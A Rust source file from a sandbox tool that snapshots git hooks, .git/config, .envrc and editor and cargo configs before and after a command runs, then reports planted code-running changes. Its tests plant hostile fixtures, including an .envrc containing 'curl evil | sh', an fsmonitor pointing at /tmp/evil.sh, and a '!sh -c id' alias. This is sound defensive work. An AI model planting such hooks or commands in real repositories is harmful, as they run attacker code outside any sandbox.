//! Snapshots of files that other tools run code from later, and what changed between two.
//!
//! Landlock can't make `.git/hooks` read-only inside a writable project directory, so a cant
//! that may write the project (agent-sh, git, cargo) could plant a hook, `core.fsmonitor` or an
//! `.envrc` that runs later, outside any sandbox. `cant` can't prevent that. It takes a
//! [`Snapshot`] of those files before such a cant runs and another after, and reports the
//! difference as a session (see `session.rs`) that the user can review and revert.
//!
//! What is watched, in the current directory and in subdirectories up to [`NESTED_DEPTH`] deep
//! (nested repositories, monorepo packages): `.git` when it is a file or link, `.git/config`,
//! `.git/hooks`, `.envrc`, `.pre-commit-config.yaml`, `.cargo/config(.toml)`, `.githooks`,
//! `.husky`, `.vscode` and `.idea/runConfigurations`. Symlinks are recorded, never followed.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::io::Read;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;

use cant_store::Digest;

/// Largest file whose contents are kept. Bigger files are compared by digest, and can't be
/// reverted.
pub const MAX_BLOB: u64 = 1024 * 1024;
/// Most entries in one snapshot.
const MAX_ENTRIES: usize = 4096;
/// Most directories looked at while searching for nested projects.
const MAX_DIRS: usize = 20_000;
/// How deep below the current directory nested projects are searched for.
pub const NESTED_DEPTH: usize = 3;
/// How deep inside a watched directory (`.husky/_/…`) entries are recorded.
const TREE_DEPTH: usize = 4;

/// Single files watched in a project directory. `.git` counts only when it is a file or a
/// link (a worktree or submodule pointing elsewhere).
const ROOT_FILES: &[&str] = &[
    ".git",
    ".git/config",
    ".envrc",
    ".pre-commit-config.yaml",
    ".cargo/config.toml",
    ".cargo/config",
];
/// Directories watched in a project directory, with everything in them.
const ROOT_TREES: &[&str] = &[
    ".git/hooks",
    ".githooks",
    ".husky",
    ".vscode",
    ".idea/runConfigurations",
];
/// First path components of the above: a directory is only examined further if it has one.
const TRIGGER_NAMES: &[&str] = &[
    ".git",
    ".envrc",
    ".pre-commit-config.yaml",
    ".cargo",
    ".githooks",
    ".husky",
    ".vscode",
    ".idea",
];
/// Directories not searched for nested projects: large, and generated.
const SKIP_DIRS: &[&str] = &[
    "node_modules",
    "target",
    ".venv",
    "venv",
    "__pycache__",
    ".tox",
    ".mypy_cache",
];

/// What a watched path is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FileKind {
    File,
    Dir,
    Symlink,
    Other,
}

impl FileKind {
    fn word(self) -> &'static str {
        match self {
            FileKind::File => "file",
            FileKind::Dir => "dir",
            FileKind::Symlink => "symlink",
            FileKind::Other => "other",
        }
    }

    fn from_word(word: &str) -> Option<Self> {
        Some(match word {
            "file" => FileKind::File,
            "dir" => FileKind::Dir,
            "symlink" => FileKind::Symlink,
            "other" => FileKind::Other,
            _ => return None,
        })
    }
}

/// One watched path as recorded.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Entry {
    pub kind: FileKind,
    /// Permission bits (`0o755`); 0 for symlinks.
    pub mode: u32,
    /// `sha256:…` of the contents (of the link target for a symlink).
    pub digest: String,
    /// File contents up to [`MAX_BLOB`], or a symlink's target.
    pub content: Option<Vec<u8>>,
}

impl Entry {
    /// Same kind, permissions and contents.
    pub fn same(&self, other: &Entry) -> bool {
        self.kind == other.kind && self.mode == other.mode && self.digest == other.digest
    }
}

/// Watched paths, relative to the project directory.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Snapshot {
    pub entries: BTreeMap<String, Entry>,
    /// A limit was reached, so not everything was recorded.
    pub truncated: bool,
}

fn entry_of(path: &Path) -> Option<Entry> {
    let meta = std::fs::symlink_metadata(path).ok()?;
    let ft = meta.file_type();
    let mode = meta.permissions().mode() & 0o7777;
    if ft.is_symlink() {
        let target = std::fs::read_link(path).ok()?;
        let bytes = target.as_os_str().as_encoded_bytes().to_vec();
        return Some(Entry {
            kind: FileKind::Symlink,
            mode: 0,
            digest: Digest::of_bytes(&bytes).to_string(),
            content: Some(bytes),
        });
    }
    if ft.is_dir() {
        return Some(Entry {
            kind: FileKind::Dir,
            mode,
            digest: "dir".into(),
            content: None,
        });
    }
    if ft.is_file() {
        // Read once, so the digest and the contents describe the same bytes.
        let mut buf = Vec::new();
        std::fs::File::open(path)
            .ok()?
            .take(MAX_BLOB + 1)
            .read_to_end(&mut buf)
            .ok()?;
        let (digest, content) = if buf.len() as u64 <= MAX_BLOB {
            (Digest::of_bytes(&buf).to_string(), Some(buf))
        } else {
            (Digest::of_file(path).ok()?.to_string(), None)
        };
        return Some(Entry {
            kind: FileKind::File,
            mode,
            digest,
            content,
        });
    }
    Some(Entry {
        kind: FileKind::Other,
        mode,
        digest: "other".into(),
        content: None,
    })
}

fn join_rel(dir: &str, name: &str) -> String {
    if dir.is_empty() {
        name.to_string()
    } else {
        format!("{dir}/{name}")
    }
}

/// Names in a directory that are plain UTF-8 without newlines (anything else can't be a file
/// git, direnv or an editor looks for, and would not survive the snapshot format), sorted,
/// with whether each is a real directory (not a link to one).
fn listing(dir: &Path) -> Vec<(String, bool)> {
    let Ok(rd) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut names: Vec<(String, bool)> = rd
        .filter_map(Result::ok)
        .filter_map(|e| {
            let name = e.file_name().into_string().ok()?;
            if name.contains('\n') {
                return None;
            }
            let is_dir = e.file_type().is_ok_and(|t| t.is_dir());
            Some((name, is_dir))
        })
        .collect();
    names.sort();
    names
}

struct Walker<'a> {
    cwd: &'a Path,
    snap: Snapshot,
    dirs_seen: usize,
}

impl Walker<'_> {
    fn record(&mut self, rel: &str, entry: Entry) {
        if self.snap.entries.len() >= MAX_ENTRIES {
            self.snap.truncated = true;
            return;
        }
        self.snap.entries.insert(rel.to_string(), entry);
    }

    fn file(&mut self, rel: &str) {
        if let Some(e) = entry_of(&self.cwd.join(rel)) {
            // `.git` itself only matters when it isn't the usual directory.
            if rel.rsplit('/').next() == Some(".git") && e.kind == FileKind::Dir {
                return;
            }
            self.record(rel, e);
        }
    }

    fn tree(&mut self, rel: &str, depth: usize) {
        let Some(e) = entry_of(&self.cwd.join(rel)) else {
            return;
        };
        let is_dir = e.kind == FileKind::Dir;
        self.record(rel, e);
        if !is_dir {
            return;
        }
        if depth >= TREE_DEPTH {
            self.snap.truncated = true;
            return;
        }
        for (name, _) in listing(&self.cwd.join(rel)) {
            self.tree(&join_rel(rel, &name), depth + 1);
        }
    }

    fn project(&mut self, rel: &str, depth: usize) {
        self.dirs_seen += 1;
        if self.dirs_seen > MAX_DIRS {
            self.snap.truncated = true;
            return;
        }
        let names = listing(&self.cwd.join(rel));
        let present: BTreeSet<&str> = names.iter().map(|(n, _)| n.as_str()).collect();
        let has = |path: &str| present.contains(path.split('/').next().unwrap_or(""));
        for f in ROOT_FILES {
            if has(f) {
                self.file(&join_rel(rel, f));
            }
        }
        for t in ROOT_TREES {
            if has(t) {
                self.tree(&join_rel(rel, t), 0);
            }
        }
        if depth >= NESTED_DEPTH {
            return;
        }
        for (name, is_dir) in &names {
            if *is_dir
                && !SKIP_DIRS.contains(&name.as_str())
                && !TRIGGER_NAMES.contains(&name.as_str())
            {
                self.project(&join_rel(rel, name), depth + 1);
            }
        }
    }
}

/// The watched paths in `cwd` as they are now.
pub fn collect(cwd: &Path) -> Snapshot {
    let mut w = Walker {
        cwd,
        snap: Snapshot::default(),
        dirs_seen: 0,
    };
    w.project("", 0);
    w.snap
}

// ---- storing a snapshot ----------------------------------------------------------------------

fn blob_name(digest: &str) -> &str {
    digest.trim_start_matches("sha256:")
}

/// Writes `snap` into `dir` (an `index` file and `blobs/`), readable only by the user.
pub fn save(dir: &Path, snap: &Snapshot) -> std::io::Result<()> {
    let blobs = dir.join("blobs");
    std::fs::create_dir_all(&blobs)?;
    std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
    let mut index = format!("v1 truncated={}\n", u8::from(snap.truncated));
    for (path, e) in &snap.entries {
        let _ = writeln!(index, "{} {} {:o} {path}", e.digest, e.kind.word(), e.mode);
        if let Some(c) = &e.content {
            let name = if e.kind == FileKind::Symlink {
                format!("link-{}", blob_name(&e.digest))
            } else {
                blob_name(&e.digest).to_string()
            };
            std::fs::write(blobs.join(name), c)?;
        }
    }
    std::fs::write(dir.join("index"), index)
}

/// Reads a snapshot written by [`save`].
pub fn load(dir: &Path) -> std::io::Result<Snapshot> {
    let bad = || std::io::Error::new(std::io::ErrorKind::InvalidData, "corrupt snapshot");
    let index = std::fs::read_to_string(dir.join("index"))?;
    let mut lines = index.lines();
    let truncated = match lines.next() {
        Some("v1 truncated=0") => false,
        Some("v1 truncated=1") => true,
        _ => return Err(bad()),
    };
    let mut snap = Snapshot {
        entries: BTreeMap::new(),
        truncated,
    };
    for line in lines {
        let mut parts = line.splitn(4, ' ');
        let (Some(digest), Some(kind), Some(mode), Some(path)) =
            (parts.next(), parts.next(), parts.next(), parts.next())
        else {
            return Err(bad());
        };
        let kind = FileKind::from_word(kind).ok_or_else(bad)?;
        let mode = u32::from_str_radix(mode, 8).map_err(|_| bad())?;
        let name = if kind == FileKind::Symlink {
            format!("link-{}", blob_name(digest))
        } else {
            blob_name(digest).to_string()
        };
        let content = match kind {
            FileKind::File | FileKind::Symlink => std::fs::read(dir.join("blobs").join(name)).ok(),
            _ => None,
        };
        snap.entries.insert(
            path.to_string(),
            Entry {
                kind,
                mode,
                digest: digest.into(),
                content,
            },
        );
    }
    Ok(snap)
}

// ---- comparing --------------------------------------------------------------------------------

/// What happened to one path.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    Added,
    Removed,
    Modified,
}

/// A difference between two snapshots.
#[derive(Debug, Clone)]
pub struct Change {
    pub path: String,
    pub kind: Kind,
    pub added: Vec<String>,
    pub removed: Vec<String>,
    /// Why this can run code later, if it can.
    pub executes: Vec<String>,
    /// The change can't run code and isn't worth telling anyone about: new directories,
    /// git's sample hooks, and new remotes or branches in `.git/config`.
    pub benign: bool,
}

fn lines_of(entry: Option<&Entry>) -> Vec<String> {
    let Some(e) = entry else {
        return Vec::new();
    };
    match (e.kind, &e.content) {
        (FileKind::Dir, _) => Vec::new(),
        (FileKind::Symlink, Some(t)) => vec![format!("-> {}", String::from_utf8_lossy(t))],
        (FileKind::File, Some(bytes)) => match std::str::from_utf8(bytes) {
            Ok(text) => text.lines().map(str::to_string).collect(),
            Err(_) => vec![format!("(binary, {} bytes)", bytes.len())],
        },
        _ => vec!["(large or unreadable)".into()],
    }
}

/// One `.git/config` setting.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct Setting {
    section: String,
    key: String,
    value: String,
}

/// A deliberately small git-config reader. Anything it can't parse becomes a setting with the
/// key `?`, which is never benign, so odd syntax is reported rather than skipped.
fn parse_config(text: &str) -> BTreeSet<Setting> {
    let mut out = BTreeSet::new();
    let mut section = String::new();
    for raw in text.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if let Some(rest) = line.strip_prefix('[') {
            match rest.strip_suffix(']') {
                Some(name) if !name.contains(['[', ']']) => {
                    // `[remote "origin"]` -> `remote.origin`; section names are case-insensitive.
                    let (head, sub) = match name.split_once(char::is_whitespace) {
                        Some((h, s)) => (
                            h.to_ascii_lowercase(),
                            s.trim().trim_matches('"').to_string(),
                        ),
                        None => (name.to_ascii_lowercase(), String::new()),
                    };
                    section = if sub.is_empty() {
                        head
                    } else {
                        format!("{head}.{sub}")
                    };
                }
                _ => {
                    out.insert(Setting {
                        section: section.clone(),
                        key: "?".into(),
                        value: line.into(),
                    });
                }
            }
            continue;
        }
        let (key, value) = match line.split_once('=') {
            Some((k, v)) => (
                k.trim().to_ascii_lowercase(),
                v.trim().trim_matches('"').to_string(),
            ),
            None => (line.to_ascii_lowercase(), "true".to_string()),
        };
        out.insert(Setting {
            section: section.clone(),
            key,
            value,
        });
    }
    out
}

fn is_bool(value: &str) -> bool {
    matches!(
        value.to_ascii_lowercase().as_str(),
        "true" | "false" | "yes" | "no" | "on" | "off" | "0" | "1" | ""
    )
}

/// Why a git setting can run code, if it can.
fn config_executes(s: &Setting) -> Option<String> {
    let head = s.section.split('.').next().unwrap_or("");
    let runs = match s.key.as_str() {
        "command" | "cmd" | "program" | "helper" | "editor" | "pager" | "textconv" | "clean"
        | "smudge" | "process" | "driver" | "sshcommand" | "hookspath" | "templatedir"
        | "packobjectshook" | "difffilter" | "askpass" | "gitproxy" | "vcs" | "uploadpack"
        | "receivepack" | "fsmonitor" => !is_bool(&s.value),
        "path" => matches!(head, "include" | "includeif" | "difftool" | "mergetool"),
        _ => false,
    } || head == "pager" && !is_bool(&s.value)
        || s.value.starts_with('!');
    runs.then(|| {
        let name = if s.section.is_empty() {
            s.key.clone()
        } else {
            format!("{}.{}", s.section, s.key)
        };
        format!("{name} = {}", s.value)
    })
}

/// Settings that git itself writes in ordinary use and that cannot run code.
fn config_benign(s: &Setting) -> bool {
    let head = s.section.split('.').next().unwrap_or("");
    match head {
        "branch" => matches!(
            s.key.as_str(),
            "remote" | "merge" | "rebase" | "pushremote" | "mergeoptions" | "description"
        ),
        "remote" => matches!(
            s.key.as_str(),
            "url" | "pushurl" | "fetch" | "push" | "tagopt" | "prune" | "mirror"
        ),
        "user" => matches!(s.key.as_str(), "name" | "email" | "signingkey"),
        "core" => matches!(
            s.key.as_str(),
            "repositoryformatversion"
                | "filemode"
                | "bare"
                | "logallrefupdates"
                | "ignorecase"
                | "precomposeunicode"
                | "symlinks"
                | "sparsecheckout"
        ),
        "submodule" => matches!(s.key.as_str(), "url" | "active"),
        _ => false,
    }
}

/// The last component and the directory part of a relative path.
fn split_name(path: &str) -> (&str, &str) {
    match path.rsplit_once('/') {
        Some((dir, name)) => (dir, name),
        None => ("", path),
    }
}

/// Why a watched file other than `.git/config` can run code.
fn file_executes(path: &str) -> Option<String> {
    let (dir, name) = split_name(path);
    if dir == ".git/hooks" || dir.ends_with("/.git/hooks") {
        return Some(format!("git runs this hook ({name})"));
    }
    let has = |part: &str| path.split('/').any(|c| c == part);
    if name == ".envrc" {
        Some("direnv runs this when you enter the directory".into())
    } else if name == ".git" {
        Some("points git at another directory, with that directory's hooks".into())
    } else if name == ".pre-commit-config.yaml" {
        Some("pre-commit runs the hooks listed here".into())
    } else if has(".cargo") {
        Some("cargo runs programs named here (runner, linker, aliases)".into())
    } else if has(".vscode") {
        Some("VS Code runs tasks and reads settings from here".into())
    } else if has(".husky") || has(".githooks") {
        Some("runs as a git hook if core.hooksPath points here".into())
    } else if has(".idea") {
        Some("JetBrains run configuration".into())
    } else {
        None
    }
}

fn is_config(path: &str) -> bool {
    path == ".git/config" || path.ends_with("/.git/config")
}

fn classify(
    path: &str,
    kind: Kind,
    before: Option<&Entry>,
    after: Option<&Entry>,
) -> (Vec<String>, bool) {
    let after_kind = after.map(|e| e.kind);
    let before_kind = before.map(|e| e.kind);
    // Directories by themselves run nothing; their contents are entries of their own.
    if after_kind.unwrap_or(FileKind::Dir) == FileKind::Dir
        && before_kind.unwrap_or(FileKind::Dir) == FileKind::Dir
    {
        return (Vec::new(), true);
    }
    // git never runs its sample hooks.
    if path.ends_with(".sample") && after_kind != Some(FileKind::Symlink) {
        return (Vec::new(), true);
    }
    if kind == Kind::Removed {
        return (Vec::new(), false);
    }
    if is_config(path) && after_kind == Some(FileKind::File) {
        let text = |e: Option<&Entry>| {
            e.filter(|e| e.kind == FileKind::File)
                .and_then(|e| e.content.as_ref())
                .map(|c| String::from_utf8_lossy(c).into_owned())
        };
        let Some(new_text) = text(after) else {
            return (
                vec![".git/config is too large to inspect".to_string()],
                false,
            );
        };
        let old = parse_config(&text(before).unwrap_or_default());
        let new_settings: Vec<Setting> =
            parse_config(&new_text).difference(&old).cloned().collect();
        let executes: Vec<String> = new_settings.iter().filter_map(config_executes).collect();
        let benign = executes.is_empty() && new_settings.iter().all(config_benign);
        return (executes, benign);
    }
    let mut why: Vec<String> = file_executes(path).into_iter().collect();
    if after_kind == Some(FileKind::Symlink) {
        why.push("is now a symbolic link".into());
    }
    (why, false)
}

/// Every difference between two snapshots, benign or not.
pub fn diff(before: &Snapshot, after: &Snapshot) -> Vec<Change> {
    let mut paths: BTreeSet<&String> = before.entries.keys().collect();
    paths.extend(after.entries.keys());
    let mut changes = Vec::new();
    for path in paths {
        let (b, a) = (before.entries.get(path), after.entries.get(path));
        let kind = match (b, a) {
            (Some(b), Some(a)) if b.same(a) => continue,
            (None, None) => continue,
            (None, Some(_)) => Kind::Added,
            (Some(_), None) => Kind::Removed,
            _ => Kind::Modified,
        };
        let old_lines = lines_of(b);
        let new_lines = lines_of(a);
        let old_set: BTreeSet<&String> = old_lines.iter().collect();
        let new_set: BTreeSet<&String> = new_lines.iter().collect();
        let added = new_lines
            .iter()
            .filter(|l| !old_set.contains(l))
            .cloned()
            .collect();
        let removed = old_lines
            .iter()
            .filter(|l| !new_set.contains(l))
            .cloned()
            .collect();
        let (mut executes, benign) = classify(path, kind, b, a);
        if let (Some(b), Some(a)) = (b, a) {
            if b.mode != a.mode && a.mode & 0o111 != 0 && b.mode & 0o111 == 0 {
                executes.push(format!("made executable ({:o} -> {:o})", b.mode, a.mode));
            }
        }
        changes.push(Change {
            path: path.clone(),
            kind,
            added,
            removed,
            executes,
            benign,
        });
    }
    changes
}

/// Changes worth telling the user about.
pub fn reportable(changes: &[Change]) -> Vec<&Change> {
    changes.iter().filter(|c| !c.benign).collect()
}

/// A multi-line description of `changes`, each line indented by two spaces.
pub fn describe(changes: &[&Change], with_lines: bool) -> String {
    let mut out = String::new();
    for c in changes {
        let what = match c.kind {
            Kind::Added => "new",
            Kind::Removed => "removed",
            Kind::Modified => "changed",
        };
        let _ = writeln!(out, "  {what}: {}", c.path);
        for why in &c.executes {
            let _ = writeln!(out, "    RUNS CODE: {why}");
        }
        if with_lines {
            for l in c.removed.iter().take(40) {
                let _ = writeln!(out, "    - {l}");
            }
            for l in c.added.iter().take(40) {
                let _ = writeln!(out, "    + {l}");
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project() -> (tempfile::TempDir, std::path::PathBuf) {
        let dir = tempfile::tempdir().expect("tempdir");
        let work = std::fs::canonicalize(dir.path()).expect("canonical");
        std::fs::create_dir_all(work.join(".git/hooks")).expect("mkdir");
        std::fs::write(
            work.join(".git/config"),
            "[core]\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.com/x.git\n",
        )
        .expect("write");
        std::fs::write(work.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\n").expect("write");
        std::fs::create_dir_all(work.join("src")).expect("mkdir");
        (dir, work)
    }

    fn append(path: &Path, text: &str) {
        use std::io::Write;
        std::fs::OpenOptions::new()
            .append(true)
            .open(path)
            .expect("open")
            .write_all(text.as_bytes())
            .expect("write");
    }

    fn report(before: &Snapshot, after: &Snapshot) -> String {
        let changes = diff(before, after);
        describe(&reportable(&changes), true)
    }

    #[test]
    fn nothing_changed_is_nothing() {
        let (_d, w) = project();
        let a = collect(&w);
        assert!(a.entries.contains_key(".git/config"));
        assert!(a.entries.contains_key(".git/hooks/pre-commit.sample"));
        assert!(diff(&a, &collect(&w)).is_empty());
    }

    #[test]
    fn planted_fsmonitor_hook_envrc_and_nested_project_are_reported() {
        let (_d, w) = project();
        let before = collect(&w);
        append(
            &w.join(".git/config"),
            "[core]\n\tfsmonitor = /tmp/evil.sh\n",
        );
        std::fs::write(w.join(".git/hooks/post-checkout"), "#!/bin/sh\nid\n").expect("write");
        std::fs::write(w.join(".envrc"), "curl evil | sh\n").expect("write");
        std::fs::create_dir_all(w.join("pkg/sub/.vscode")).expect("mkdir");
        std::fs::write(w.join("pkg/sub/.vscode/tasks.json"), "{}").expect("write");
        let text = report(&before, &collect(&w));
        assert!(
            text.contains("RUNS CODE: core.fsmonitor = /tmp/evil.sh"),
            "{text}"
        );
        assert!(text.contains("+ \tfsmonitor = /tmp/evil.sh"), "{text}");
        assert!(text.contains("new: .git/hooks/post-checkout"), "{text}");
        assert!(text.contains("new: .envrc"), "{text}");
        assert!(text.contains("new: pkg/sub/.vscode/tasks.json"), "{text}");
    }

    #[test]
    fn remotes_branches_samples_and_new_repositories_are_benign() {
        let (_d, w) = project();
        let before = collect(&w);
        append(
            &w.join(".git/config"),
            "[branch \"main\"]\n\tremote = origin\n\tmerge = refs/heads/main\n",
        );
        std::fs::create_dir_all(w.join("sub/.git/hooks")).expect("mkdir");
        std::fs::write(w.join("sub/.git/config"), "[core]\n\tbare = false\n").expect("write");
        std::fs::write(w.join("sub/.git/hooks/update.sample"), "x").expect("write");
        let after = collect(&w);
        let changes = diff(&before, &after);
        assert!(!changes.is_empty());
        assert!(
            reportable(&changes).is_empty(),
            "{}",
            report(&before, &after)
        );
    }

    #[test]
    fn modes_symlinks_and_unknown_settings_are_reported() {
        let (_d, w) = project();
        std::fs::write(w.join(".git/hooks/pre-push"), "#!/bin/sh\n").expect("write");
        std::fs::set_permissions(
            w.join(".git/hooks/pre-push"),
            std::fs::Permissions::from_mode(0o644),
        )
        .expect("chmod");
        let before = collect(&w);
        std::fs::set_permissions(
            w.join(".git/hooks/pre-push"),
            std::fs::Permissions::from_mode(0o755),
        )
        .expect("chmod");
        std::os::unix::fs::symlink("/etc/passwd", w.join(".envrc")).expect("symlink");
        append(
            &w.join(".git/config"),
            "[alias]\n\tx = !sh -c id\n[weird]\n\tthing = 1\n",
        );
        let text = report(&before, &collect(&w));
        assert!(text.contains("made executable"), "{text}");
        assert!(text.contains("is now a symbolic link"), "{text}");
        assert!(text.contains("alias.x = !sh -c id"), "{text}");
        assert!(text.contains("+ [weird]"), "{text}");
    }

    #[test]
    fn git_directory_renamed_away_and_back_is_seen_through_its_contents() {
        let (_d, w) = project();
        let before = collect(&w);
        std::fs::rename(w.join(".git"), w.join("moved")).expect("rename");
        std::fs::write(w.join("moved/hooks/pre-commit"), "#!/bin/sh\nid\n").expect("write");
        std::fs::rename(w.join("moved"), w.join(".git")).expect("rename back");
        let text = report(&before, &collect(&w));
        assert!(text.contains("new: .git/hooks/pre-commit"), "{text}");
    }

    #[test]
    fn snapshots_survive_save_and_load() {
        let (_d, w) = project();
        std::os::unix::fs::symlink("target", w.join(".envrc")).expect("symlink");
        let snap = collect(&w);
        let store = tempfile::tempdir().expect("tempdir");
        save(store.path(), &snap).expect("save");
        assert_eq!(load(store.path()).expect("load"), snap);
    }

    #[test]
    fn config_parser_reads_sections_and_flags_what_it_cannot_parse() {
        let s = parse_config("[Core]\n  FSMonitor = x\n[remote \"o\"]\nurl = u\n[broken\n");
        assert!(
            s.iter()
                .any(|x| x.section == "core" && x.key == "fsmonitor" && x.value == "x")
        );
        assert!(s.iter().any(|x| x.section == "remote.o" && x.key == "url"));
        let odd = s.iter().find(|x| x.key == "?").expect("?");
        assert!(!config_benign(odd));
        let off = Setting {
            section: "core".into(),
            key: "fsmonitor".into(),
            value: "false".into(),
        };
        assert!(config_executes(&off).is_none());
    }
}
